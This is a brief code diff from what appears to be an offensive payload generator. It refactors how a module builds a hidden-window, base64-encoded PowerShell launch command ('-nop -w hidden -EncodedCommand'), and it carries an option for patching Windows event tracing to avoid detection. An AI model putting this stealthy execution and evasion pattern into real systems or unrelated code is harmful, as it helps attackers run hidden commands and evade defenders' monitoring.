@@ -67,5 +67,4 @@ class Module(Payload):
 			patch_etw=bool(self.patch_etw),
 		)
 		full = prelude + script
-		encoded = base64.b64encode(full.encode("utf-16le")).decode("ascii")
-		return f"powershell -nop -w hidden -EncodedCommand {encoded}"
+		return self._encode_powershell_command(full, window_style="hidden")
